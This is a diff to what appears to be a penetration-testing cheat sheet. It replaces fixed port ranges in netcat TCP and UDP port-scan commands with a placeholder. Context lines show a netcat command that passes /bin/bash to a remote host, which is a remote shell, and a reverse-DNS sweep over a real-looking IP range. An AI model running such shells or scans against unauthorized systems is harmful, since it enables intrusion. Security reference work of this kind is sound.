@@ -633,8 +633,8 @@ nc -nv <IP> <port> -e /bin/bash                                          Send a 
 
 **Port Scanning**
 ```
-nc -nvv -w 1 -z <IP> 3388-3390                        Use netcat to perform a TCP port scan
-nc -nv -u -z -w 1 <IP> 160-162                        Use netcat to perform an UDP port scan
+nc -nvv -w 1 -z <IP> <PORT-RANGE>                        Use netcat to perform a TCP port scan
+nc -nv -u -z -w 1 <IP> <PORT-RANGE>                      Use netcat to perform an UDP port scan
 ```
 
 ### <ins>Socat</ins>
@@ -1068,8 +1068,8 @@ for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
 
 #### **Netcat**
 ```
-nc -nvv -w 1 -z <IP> 3388-3390                        Use netcat to perform a TCP port scan
-nc -nv -u -z -w 1 <IP> 160-162                        Use netcat to perform an UDP port scan
+nc -nvv -w 1 -z <IP> <PORT-RANGE>                        Use netcat to perform a TCP port scan
+nc -nv -u -z -w 1 <IP> <PORT-RANGE>                      Use netcat to perform an UDP port scan
 ```
 
 #### **Nmap**
